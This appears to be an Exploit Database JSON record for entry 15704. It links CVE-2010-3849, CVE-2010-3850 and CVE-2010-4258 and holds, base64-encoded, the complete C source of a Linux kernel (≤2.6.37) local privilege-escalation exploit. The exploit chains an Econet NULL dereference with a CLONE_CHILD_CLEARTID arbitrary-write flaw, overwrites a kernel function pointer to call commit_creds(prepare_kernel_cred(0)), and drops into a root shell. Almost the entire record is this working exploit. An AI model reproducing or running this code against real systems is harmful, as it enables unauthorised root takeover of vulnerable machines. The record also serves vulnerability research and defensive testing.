{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExpbnV4IEtlcm5lbCA8PSAyLjYuMzcgbG9jYWwgcHJpdmlsZWdlIGVzY2FsYXRpb24NCiAqIGJ5IERhbiBSb3NlbmJlcmcNCiAqIEBkanJibGlzcyBvbiB0d2l0dGVyDQogKg0KICogVXNhZ2U6DQogKiBnY2MgZnVsbC1uZWxzb24uYyAtbyBmdWxsLW5lbHNvbg0KICogLi9mdWxsLW5lbHNvbg0KICoNCiAqIFRoaXMgZXhwbG9pdCBsZXZlcmFnZXMgdGhyZWUgdnVsbmVyYWJpbGl0aWVzIHRvIGdldCByb290LCBhbGwgb2Ygd2hpY2ggd2VyZQ0KICogZGlzY292ZXJlZCBieSBOZWxzb24gRWxoYWdlOg0KICoNCiAqIENWRS0yMDEwLTQyNTgNCiAqIC0tLS0tLS0tLS0tLS0NCiAqIFRoaXMgaXMgdGhlIGludGVyZXN0aW5nIG9uZSwgYW5kIHRoZSByZWFzb24gSSB3cm90ZSB0aGlzIGV4cGxvaXQuICBJZiBhDQogKiB0aHJlYWQgaXMgY3JlYXRlZCB2aWEgY2xvbmUoMikgdXNpbmcgdGhlIENMT05FX0NISUxEX0NMRUFSVElEIGZsYWcsIGEgTlVMTA0KICogd29yZCB3aWxsIGJlIHdyaXR0ZW4gdG8gYSB1c2VyLXNwZWNpZmllZCBwb2ludGVyIHdoZW4gdGhhdCB0aHJlYWQgZXhpdHMuDQogKiBUaGlzIHdyaXRlIGlzIGRvbmUgdXNpbmcgcHV0X3VzZXIoKSwgd2hpY2ggZW5zdXJlcyB0aGUgcHJvdmlkZWQgZGVzdGluYXRpb24NCiAqIHJlc2lkZXMgaW4gdmFsaWQgdXNlcnNwYWNlIGJ5IGludm9raW5nIGFjY2Vzc19vaygpLiAgSG93ZXZlciwgTmVsc29uDQogKiBkaXNjb3ZlcmVkIHRoYXQgd2hlbiB0aGUga2VybmVsIHBlcmZvcm1zIGFuIGFkZHJlc3MgbGltaXQgb3ZlcnJpZGUgdmlhDQogKiBzZXRfZnMoS0VSTkVMX0RTKSBhbmQgdGhlIHRocmVhZCBzdWJzZXF1ZW50bHkgT09QU2VzICh2aWEgQlVHLCBwYWdlIGZhdWx0LA0KICogZXRjLiksIHRoaXMgb3ZlcnJpZGUgaXMgbm90IHJldmVydGVkIGJlZm9yZSBjYWxsaW5nIHB1dF91c2VyKCkgaW4gdGhlIGV4aXQNCiAqIHBhdGgsIGFsbG93aW5nIGEgdXNlciB0byB3cml0ZSBhIE5VTEwgd29yZCB0byBhbiBhcmJpdHJhcnkga2VybmVsIGFkZHJlc3MuDQogKiBOb3RlIHRoYXQgdGhpcyBpc3N1ZSByZXF1aXJlcyBhbiBhZGRpdGlvbmFsIHZ1bG5lcmFiaWxpdHkgdG8gdHJpZ2dlci4NCiAqDQogKiBDVkUtMjAxMC0zODQ5DQogKiAtLS0tLS0tLS0tLS0tDQogKiBUaGlzIGlzIGEgTlVMTCBwb2ludGVyIGRlcmVmZXJlbmNlIGluIHRoZSBFY29uZXQgcHJvdG9jb2wuICBCeSBpdHNlbGYsIGl0J3MNCiAqIGZhaXJseSBiZW5pZ24gYXMgYSBsb2NhbCBkZW5pYWwtb2Ytc2VydmljZS4gIEl0J3MgYSBwZXJmZWN0IGNhbmRpZGF0ZSB0bw0KICogdHJpZ2dlciB0aGUgYWJvdmUgaXNzdWUsIHNpbmNlIGl0J3MgcmVhY2hhYmxlIHZpYSBzb2NrX25vX3NlbmRwYWdlKCksIHdoaWNoDQogKiBzdWJzZXF1ZW50bHkgY2FsbHMgc2VuZG1zZyB1bmRlciBLRVJORUxfRFMuDQogKg0KICogQ1ZFLTIwMTAtMzg1MA0KICogLS0tLS0tLS0tLS0tLQ0KICogSSB3b3VsZG4ndCBiZSBhYmxlIHRvIHJlYWNoIHRoZSBOVUxMIHBvaW50ZXIgZGVyZWZlcmVuY2UgYW5kIHRyaWdnZXIgdGhlDQogKiBPT1BTIGlmIHVzZXJzIHdlcmVuJ3QgYWJsZSB0byBhc3NpZ24gRWNvbmV0IGFkZHJlc3NlcyB0byBhcmJpdHJhcnkNCiAqIGludGVyZmFjZXMgZHVlIHRvIGEgbWlzc2luZyBjYXBhYmlsaXRpZXMgY2hlY2suDQogKg0KICogSW4gdGhlIGludGVyZXN0IG9mIHB1YmxpYyBzYWZldHksIHRoaXMgZXhwbG9pdCB3YXMgc3BlY2lmaWNhbGx5IGRlc2lnbmVkIHRvDQogKiBiZSBsaW1pdGVkOg0KICoNCiAqICAqIFRoZSBwYXJ0aWN1bGFyIHN5bWJvbHMgSSByZXNvbHZlIGFyZSBub3QgZXhwb3J0ZWQgb24gU2xhY2t3YXJlIG9yIERlYmlhbg0KICogICogUmVkIEhhdCBkb2VzIG5vdCBzdXBwb3J0IEVjb25ldCBieSBkZWZhdWx0DQogKiAgKiBDVkUtMjAxMC0zODQ5IGFuZCBDVkUtMjAxMC0zODUwIGhhdmUgYm90aCBiZWVuIHBhdGNoZWQgYnkgVWJ1bnR1IGFuZA0KICogICAgRGViaWFuDQogKg0KICogSG93ZXZlciwgdGhlIGltcG9ydGFudCBpc3N1ZSwgQ1ZFLTIwMTAtNDI1OCwgYWZmZWN0cyBldmVyeW9uZSwgYW5kIGl0IHdvdWxkDQogKiBiZSB0cml2aWFsIHRvIGZpbmQgYW4gdW5wYXRjaGVkIERvUyB1bmRlciBLRVJORUxfRFMgYW5kIHdyaXRlIGEgc2xpZ2h0bHkNCiAqIG1vcmUgc29waGlzdGljYXRlZCB2ZXJzaW9uIG9mIHRoaXMgdGhhdCBkb2Vzbid0IGhhdmUgdGhlIHJvYWRibG9ja3MgSSBwdXQgaW4NCiAqIHRvIHByZXZlbnQgYWJ1c2UgYnkgc2NyaXB0IGtpZGRpZXMuDQogKg0KICogVGVzdGVkIG9uIHVucGF0Y2hlZCBVYnVudHUgMTAuMDQga2VybmVscywgYm90aCB4ODYgYW5kIHg4Ni02NC4NCiAqDQogKiBOT1RFOiB0aGUgZXhwbG9pdCBwcm9jZXNzIHdpbGwgZGVhZGxvY2sgYW5kIHN0YXkgaW4gYSB6b21iaWUgc3RhdGUgYWZ0ZXIgeW91DQogKiBleGl0IHlvdXIgcm9vdCBzaGVsbCBiZWNhdXNlIHRoZSBFY29uZXQgdGhyZWFkIE9PUFNlcyB3aGlsZSBob2xkaW5nIHRoZQ0KICogRWNvbmV0IG11dGV4LiAgSXQgd291bGRuJ3QgYmUgdG9vIGhhcmQgdG8gZml4IHRoaXMgdXAsIGJ1dCBJIGRpZG4ndCBib3RoZXIuDQogKg0KICogR3JlZXRzIHRvIHNwZW5kZXIsIHRhdmlzbywgc3RlYWx0aCwgcGlwYWNzLCBqb25vLCBrZWVzLCBhbmQgYmxhDQogKi8NCg0KLy8gRURCLU5vdGU6IFlvdSBtYXkgbmVlZCB0byBhZGQgICcjZGVmaW5lIF9HTlVfU09VUkNFJyB0byBjb21waWxlIGluIGxhdGVyIHZlcnNpb25zIA0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxuZXQvaWYuaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN5cy91dHNuYW1lLmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KLyogSG93IG1hbnkgYnl0ZXMgc2hvdWxkIHdlIGNsZWFyIGluIG91cg0KICogZnVuY3Rpb24gcG9pbnRlciB0byBwdXQgaXQgaW50byB1c2Vyc3BhY2U/ICovDQojaWZkZWYgX194ODZfNjRfXw0KI2RlZmluZSBTSElGVCAyNA0KI2RlZmluZSBPRkZTRVQgMw0KI2Vsc2UNCiNkZWZpbmUgU0hJRlQgOA0KI2RlZmluZSBPRkZTRVQgMQ0KI2VuZGlmDQoNCi8qIHRoYW5rcyBzcGVuZGVyLi4uICovDQp1bnNpZ25lZCBsb25nIGdldF9rZXJuZWxfc3ltKGNoYXIgKm5hbWUpDQp7DQogICAgICAgIEZJTEUgKmY7DQogICAgICAgIHVuc2lnbmVkIGxvbmcgYWRkcjsNCiAgICAgICAgY2hhciBkdW1teTsNCiAgICAgICAgY2hhciBzbmFtZVs1MTJdOw0KICAgICAgICBzdHJ1Y3QgdXRzbmFtZSB2ZXI7DQogICAgICAgIGludCByZXQ7DQogICAgICAgIGludCByZXAgPSAwOw0KICAgICAgICBpbnQgb2xkc3R5bGUgPSAwOw0KDQogICAgICAgIGYgPSBmb3BlbigiL3Byb2Mva2FsbHN5bXMiLCAiciIpOw0KICAgICAgICBpZiAoZiA9PSBOVUxMKSB7DQogICAgICAgICAgICAgICAgZiA9IGZvcGVuKCIvcHJvYy9rc3ltcyIsICJyIik7DQogICAgICAgICAgICAgICAgaWYgKGYgPT0gTlVMTCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gZmFsbGJhY2s7DQogICAgICAgICAgICAgICAgb2xkc3R5bGUgPSAxOw0KICAgICAgICB9DQoNCnJlcGVhdDoNCiAgICAgICAgcmV0ID0gMDsNCiAgICAgICAgd2hpbGUocmV0ICE9IEVPRikgew0KICAgICAgICAgICAgICAgIGlmICghb2xkc3R5bGUpDQogICAgICAgICAgICAgICAgICAgICAgICByZXQgPSBmc2NhbmYoZiwgIiVwICVjICVzXG4iLCAodm9pZCAqKikmYWRkciwgJmR1bW15LCBzbmFtZSk7DQogICAgICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXQgPSBmc2NhbmYoZiwgIiVwICVzXG4iLCAodm9pZCAqKikmYWRkciwgc25hbWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJldCA9PSAyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYXIgKnA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJzdHIoc25hbWUsICJfTy8iKSB8fCBzdHJzdHIoc25hbWUsICJfUy4iKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCA9IHN0cnJjaHIoc25hbWUsICdfJyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwID4gKChjaGFyICopc25hbWUgKyA1KSAmJiAhc3RybmNtcChwIC0gMywgInNtcCIsIDMpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCA9IHAgLSA0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChwID4gKGNoYXIgKilzbmFtZSAmJiAqKHAgLSAxKSA9PSAnXycpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLS07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKnAgPSAnXDAnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmIChyZXQgPT0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZnNjYW5mKGYsICIlc1xuIiwgc25hbWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghc3RyY21wKG5hbWUsIHNuYW1lKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZnByaW50ZihzdGRvdXQsICIgWytdIFJlc29sdmVkICVzIHRvICVwJXNcbiIsIG5hbWUsICh2b2lkICopYWRkciwgcmVwID8gIiAodmlhIFN5c3RlbS5tYXApIiA6IA0KIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKGYpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGFkZHI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgZmNsb3NlKGYpOw0KICAgICAgICBpZiAocmVwKQ0KICAgICAgICAgICAgICAgIHJldHVybiAwOw0KZmFsbGJhY2s6DQogICAgICAgIHVuYW1lKCZ2ZXIpOw0KICAgICAgICBpZiAoc3RybmNtcCh2ZXIucmVsZWFzZSwgIjIuNiIsIDMpKQ0KICAgICAgICAgICAgICAgIG9sZHN0eWxlID0gMTsNCiAgICAgICAgc3ByaW50ZihzbmFtZSwgIi9ib290L1N5c3RlbS5tYXAtJXMiLCB2ZXIucmVsZWFzZSk7DQogICAgICAgIGYgPSBmb3BlbihzbmFtZSwgInIiKTsNCiAgICAgICAgaWYgKGYgPT0gTlVMTCkNCiAgICAgICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgcmVwID0gMTsNCiAgICAgICAgZ290byByZXBlYXQ7DQp9DQoNCnR5cGVkZWYgaW50IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfY29tbWl0X2NyZWRzKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KdHlwZWRlZiB1bnNpZ25lZCBsb25nIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfcHJlcGFyZV9rZXJuZWxfY3JlZCkodW5zaWduZWQgbG9uZyBjcmVkKTsNCl9jb21taXRfY3JlZHMgY29tbWl0X2NyZWRzOw0KX3ByZXBhcmVfa2VybmVsX2NyZWQgcHJlcGFyZV9rZXJuZWxfY3JlZDsNCg0Kc3RhdGljIGludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkNCmdldHJvb3Qodm9pZCAqIGZpbGUsIHZvaWQgKiB2bWEpDQp7DQoNCiAgICAgICAgY29tbWl0X2NyZWRzKHByZXBhcmVfa2VybmVsX2NyZWQoMCkpOw0KICAgICAgICByZXR1cm4gLTE7DQoNCn0NCg0KLyogV2h5IGRvIEkgZG8gdGhpcz8gIEJlY2F1c2Ugb24geDg2LTY0LCB0aGUgYWRkcmVzcyBvZg0KICogY29tbWl0X2NyZWRzIGFuZCBwcmVwYXJlX2tlcm5lbF9jcmVkIGFyZSBsb2FkZWQgcmVsYXRpdmUNCiAqIHRvIHJpcCwgd2hpY2ggbWVhbnMgSSBjYW4ndCBqdXN0IGNvcHkgdGhlIGFib3ZlIHBheWxvYWQNCiAqIGludG8gbXkgbGFuZGluZyBhcmVhLiAqLw0Kdm9pZCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkNCnRyYW1wb2xpbmUoKQ0Kew0KDQojaWZkZWYgX194ODZfNjRfXw0KICAgICAgICBhc20oIm1vdiAkZ2V0cm9vdCwgJXJheDsgY2FsbCAqJXJheDsiKTsNCiNlbHNlDQogICAgICAgIGFzbSgibW92ICRnZXRyb290LCAlZWF4OyBjYWxsIColZWF4OyIpOw0KI2VuZGlmDQoNCn0NCg0KLyogVHJpZ2dlcnMgYSBOVUxMIHBvaW50ZXIgZGVyZWZlcmVuY2UgaW4gZWNvbmV0X3NlbmRtc2cNCiAqIHZpYSBzb2NrX25vX3NlbmRwYWdlLCBzbyBpdCdzIHVuZGVyIEtFUk5FTF9EUyAqLw0KaW50IHRyaWdnZXIoaW50ICogZmlsZGVzKQ0Kew0KICAgICAgICBpbnQgcmV0Ow0KICAgICAgICBzdHJ1Y3QgaWZyZXEgaWZyOw0KDQogICAgICAgIG1lbXNldCgmaWZyLCAwLCBzaXplb2YoaWZyKSk7DQogICAgICAgIHN0cm5jcHkoaWZyLmlmcl9uYW1lLCAiZXRoMCIsIElGTkFNU0laKTsNCg0KICAgICAgICByZXQgPSBpb2N0bChmaWxkZXNbMl0sIFNJT0NTSUZBRERSLCAmaWZyKTsNCg0KICAgICAgICBpZihyZXQgPCAwKSB7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbKl0gRmFpbGVkIHRvIHNldCBFY29uZXQgYWRkcmVzcy5cbiIpOw0KICAgICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KDQogICAgICAgIHNwbGljZShmaWxkZXNbM10sIE5VTEwsIGZpbGRlc1sxXSwgTlVMTCwgMTI4LCAwKTsNCiAgICAgICAgc3BsaWNlKGZpbGRlc1swXSwgTlVMTCwgZmlsZGVzWzJdLCBOVUxMLCAxMjgsIDApOw0KDQogICAgICAgIC8qIFNob3VsZG4ndCBnZXQgaGVyZS4uLiAqLw0KICAgICAgICBleGl0KDApOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqIGFyZ3ZbXSkNCnsNCiAgICAgICAgdW5zaWduZWQgbG9uZyBlY29uZXRfb3BzLCBlY29uZXRfaW9jdGwsIHRhcmdldCwgbGFuZGluZzsNCiAgICAgICAgaW50IGZpbGRlc1s0XSwgcGlkOw0KICAgICAgICB2b2lkICogbmV3c3RhY2ssICogcGF5bG9hZDsNCg0KICAgICAgICAvKiBDcmVhdGUgZmlsZSBkZXNjcmlwdG9ycyBub3cgc28gdGhlcmUgYXJlIHR3bw0KICAgICAgICAgICByZWZlcmVuY2VzIHRvIHRoZW0gYWZ0ZXIgY2xvbmluZy4uLm90aGVyd2lzZQ0KICAgICAgICAgICB0aGUgY2hpbGQgd2lsbCBuZXZlciByZXR1cm4gYmVjYXVzZSBpdA0KICAgICAgICAgICBkZWFkbG9ja3Mgd2hlbiB0cnlpbmcgdG8gdW5sb2NrIHZhcmlvdXMNCiAgICAgICAgICAgbXV0ZXhlcyBhZnRlciBPT1BTaW5nICovDQogICAgICAgIHBpcGUoZmlsZGVzKTsNCiAgICAgICAgZmlsZGVzWzJdID0gc29ja2V0KFBGX0VDT05FVCwgU09DS19ER1JBTSwgMCk7DQogICAgICAgIGZpbGRlc1szXSA9IG9wZW4oIi9kZXYvemVybyIsIE9fUkRPTkxZKTsNCg0KICAgICAgICBpZihmaWxkZXNbMF0gPCAwIHx8IGZpbGRlc1sxXSA8IDAgfHwgZmlsZGVzWzJdIDwgMCB8fCBmaWxkZXNbM10gPCAwKSB7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbKl0gRmFpbGVkIHRvIG9wZW4gZmlsZSBkZXNjcmlwdG9ycy5cbiIpOw0KICAgICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIFJlc29sdmUgYWRkcmVzc2VzIG9mIHJlbGV2YW50IHN5bWJvbHMgKi8NCiAgICAgICAgcHJpbnRmKCJbKl0gUmVzb2x2aW5nIGtlcm5lbCBhZGRyZXNzZXMuLi5cbiIpOw0KICAgICAgICBlY29uZXRfaW9jdGwgPSBnZXRfa2VybmVsX3N5bSgiZWNvbmV0X2lvY3RsIik7DQogICAgICAgIGVjb25ldF9vcHMgPSBnZXRfa2VybmVsX3N5bSgiZWNvbmV0X29wcyIpOw0KICAgICAgICBjb21taXRfY3JlZHMgPSAoX2NvbW1pdF9jcmVkcykgZ2V0X2tlcm5lbF9zeW0oImNvbW1pdF9jcmVkcyIpOw0KICAgICAgICBwcmVwYXJlX2tlcm5lbF9jcmVkID0gKF9wcmVwYXJlX2tlcm5lbF9jcmVkKSBnZXRfa2VybmVsX3N5bSgicHJlcGFyZV9rZXJuZWxfY3JlZCIpOw0KDQogICAgICAgIGlmKCFlY29uZXRfaW9jdGwgfHwgIWNvbW1pdF9jcmVkcyB8fCAhcHJlcGFyZV9rZXJuZWxfY3JlZCB8fCAhZWNvbmV0X29wcykgew0KICAgICAgICAgICAgICAgIHByaW50ZigiWypdIEZhaWxlZCB0byByZXNvbHZlIGtlcm5lbCBzeW1ib2xzLlxuIik7DQogICAgICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYoIShuZXdzdGFjayA9IG1hbGxvYyg2NTUzNikpKSB7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbKl0gRmFpbGVkIHRvIGFsbG9jYXRlIG1lbW9yeS5cbiIpOw0KICAgICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KDQogICAgICAgIHByaW50ZigiWypdIENhbGN1bGF0aW5nIHRhcmdldC4uLlxuIik7DQogICAgICAgIHRhcmdldCA9IGVjb25ldF9vcHMgKyAxMCAqIHNpemVvZih2b2lkICopIC0gT0ZGU0VUOw0KDQogICAgICAgIC8qIENsZWFyIHRoZSBoaWdoZXIgYml0cyAqLw0KICAgICAgICBsYW5kaW5nID0gZWNvbmV0X2lvY3RsIDw8IFNISUZUID4+IFNISUZUOw0KDQogICAgICAgIHBheWxvYWQgPSBtbWFwKCh2b2lkICopKGxhbmRpbmcgJiB+MHhmZmYpLCAyICogNDA5NiwNCiAgICAgICAgICAgICAgICAgICAgICAgUFJPVF9SRUFEIHwgUFJPVF9XUklURSB8IFBST1RfRVhFQywNCiAgICAgICAgICAgICAgICAgICAgICAgTUFQX1BSSVZBVEUgfCBNQVBfQU5PTllNT1VTIHwgTUFQX0ZJWEVELCAwLCAwKTsNCg0KICAgICAgICBpZiAoKGxvbmcpcGF5bG9hZCA9PSAtMSkgew0KICAgICAgICAgICAgICAgIHByaW50ZigiWypdIEZhaWxlZCB0byBtbWFwKCkgYXQgdGFyZ2V0IGFkZHJlc3MuXG4iKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCg0KICAgICAgICBtZW1jcHkoKHZvaWQgKilsYW5kaW5nLCAmdHJhbXBvbGluZSwgMTAyNCk7DQoNCiAgICAgICAgY2xvbmUoKGludCAoKikodm9pZCAqKSl0cmlnZ2VyLA0KICAgICAgICAgICAgICAodm9pZCAqKSgodW5zaWduZWQgbG9uZyluZXdzdGFjayArIDY1NTM2KSwNCiAgICAgICAgICAgICAgQ0xPTkVfVk0gfCBDTE9ORV9DSElMRF9DTEVBUlRJRCB8IFNJR0NITEQsDQogICAgICAgICAgICAgICZmaWxkZXMsIE5VTEwsIE5VTEwsIHRhcmdldCk7DQoNCiAgICAgICAgc2xlZXAoMSk7DQoNCiAgICAgICAgcHJpbnRmKCJbKl0gVHJpZ2dlcmluZyBwYXlsb2FkLi4uXG4iKTsNCiAgICAgICAgaW9jdGwoZmlsZGVzWzJdLCAwLCBOVUxMKTsNCg0KICAgICAgICBpZihnZXR1aWQoKSkgew0KICAgICAgICAgICAgICAgIHByaW50ZigiWypdIEV4cGxvaXQgZmFpbGVkIHRvIGdldCByb290LlxuIik7DQogICAgICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQoNCiAgICAgICAgcHJpbnRmKCJbKl0gR290IHJvb3QhXG4iKTsNCiAgICAgICAgZXhlY2woIi9iaW4vc2giLCAiL2Jpbi9zaCIsIE5VTEwpOw0KfQ==", 
    "filename": "platforms/linux/local/15704.c", 
    "id": "15704", 
    "cves": [
        "CVE-2010-3849", 
        "CVE-2010-3850", 
        "CVE-2010-4258"
    ]
}